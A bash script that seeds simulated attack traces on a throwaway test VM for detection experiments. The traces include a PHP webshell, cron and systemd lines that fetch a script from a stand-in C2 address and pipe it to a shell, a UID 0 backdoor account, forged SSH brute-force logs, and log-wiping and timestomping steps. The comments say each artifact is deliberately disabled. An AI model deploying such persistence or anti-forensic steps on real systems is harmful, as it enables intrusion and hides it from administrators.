#!/usr/bin/env bash
# Plant the traces of the attack scenarios on the testbed VM.
#
#   seed.sh all     every scenario (experiment 1)
#   seed.sh e2      the web RCE and SSH scenarios only (experiment 2)
#
# Each scenario mirrors something observed on a real self-hosted server, and
# each leaves the traces that attack would leave without doing what the
# attack did. Log lines are injected with logger(1) exactly as sshd would
# write them; the cron file has a dot in its name, which cron ignores; the
# backdoor unit is written but never enabled; the preloaded library is an
# ordinary system one; the setuid file is a copy of /bin/true; the UID 0
# account is locked with no shell. Nothing here gives anyone access to
# anything, and the VM is thrown away afterwards.
#
# truth.json lists what each scenario should be detected as.
set -Eeuo pipefail
mode=${1:-all}
SCANNER=203.0.113.50      # TEST-NET-3: never a real host
C2=203.0.113.5

sshlog() { logger -t sshd --id=$((RANDOM + 2000)) -p auth.info "$*"; }

web_rce() {
  # S2: a PHP file in the upload directory that runs a fixed command, which
  # is what the first request to a dropped webshell does.
  echo '<?php echo shell_exec("id"); ?>' > /var/www/html/uploads/avatar.php
  chown www-data:www-data /var/www/html/uploads/avatar.php
  curl -fsS -o /dev/null http://127.0.0.1/uploads/avatar.php
  # A shell running as the web server's account, as a webshell leaves one.
  setsid sudo -u www-data sh -c 'sleep 3601' </dev/null >/dev/null 2>&1 &
  echo "seed S2"
}

ssh_brute() {
  # S3: guessing from one address, then a success from it.
  for i in $(seq 1 40); do
    sshlog "Failed password for invalid user admin$i from $SCANNER port $((40000 + i)) ssh2"
  done
  sshlog "Accepted password for alice from $SCANNER port 41000 ssh2"
  echo "seed S3"
}

ssh_key() {
  # S3c: a key added, used for a real login, and removed again.
  rm -f /root/fxkey /root/fxkey.pub
  ssh-keygen -q -t ed25519 -N '' -f /root/fxkey
  install -d -m 0700 -o alice -g alice /home/alice/.ssh
  cp /home/alice/.ssh/authorized_keys /root/ak.bak 2>/dev/null || : > /root/ak.bak
  cat /root/fxkey.pub >> /home/alice/.ssh/authorized_keys
  chown alice:alice /home/alice/.ssh/authorized_keys
  ssh -i /root/fxkey -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes alice@127.0.0.1 true
  cp /root/ak.bak /home/alice/.ssh/authorized_keys
  chown alice:alice /home/alice/.ssh/authorized_keys
  echo "seed S3c"
}

web_scan() {
  # S1: a scanner's 404s, and one probe that the site answers.
  for p in .env.bak .git/config wp-login.php phpmyadmin/ cgi-bin/test.cgi .aws/credentials \
           admin/ backup.zip .htpasswd server-status vendor/phpunit/x.php actuator/health; do
    for i in 1 2 3 4 5; do curl -s -o /dev/null "http://127.0.0.1/$p?$i" || true; done
  done
  echo "APP_KEY=not-a-real-secret" > /var/www/html/.env
  curl -fsS -o /dev/null http://127.0.0.1/.env
  echo "seed S1"
}

bulk_export() {
  # S5: one client downloading every export.
  for i in $(seq 1 25); do curl -fsS -o /dev/null "http://127.0.0.1/export/book$i.html"; done
  echo "seed S5"
}

persistence() {
  # S4: what an intruder leaves to come back.
  printf '*/5 * * * * root curl -fsS http://%s/s | sh\n' "$C2" > /etc/cron.d/sync.disabled
  cat > /etc/systemd/system/sync-helper.service <<UNIT
[Unit]
Description=sync helper
[Service]
ExecStart=/bin/sh -c 'curl -fsS http://$C2/x | sh'
UNIT
  echo /usr/lib/x86_64-linux-gnu/libdl.so.2 > /etc/ld.so.preload
  install -d /var/tmp/.cache
  install -m 4755 /bin/true /var/tmp/.cache/true
  grep -q '^toor:' /etc/passwd || useradd -o -u 0 -g 0 -M -d /root -s /usr/sbin/nologin toor
  passwd -l toor >/dev/null
  install -d /dev/shm/.x && cp /bin/sleep /dev/shm/.x/sleep
  setsid /dev/shm/.x/sleep 3602 </dev/null >/dev/null 2>&1 &
  echo "seed S4"
}

anti_forensics() {
  # S6: covering tracks.
  ln -sf /dev/null /home/alice/.bash_history
  : > /var/log/wtmp
  touch -d '2025-01-01 00:00' /etc/systemd/system/sync-helper.service
  echo '# local' >> /usr/bin/lsb_release
  echo "seed S6"
}

case $mode in
  all) web_scan; web_rce; ssh_brute; ssh_key; persistence; bulk_export; anti_forensics ;;
  e2)  web_rce; ssh_brute ;;
  *) echo "usage: seed.sh all|e2" >&2; exit 2 ;;
esac
sleep 2   # let rsyslog flush
echo "seed_done mode=$mode"
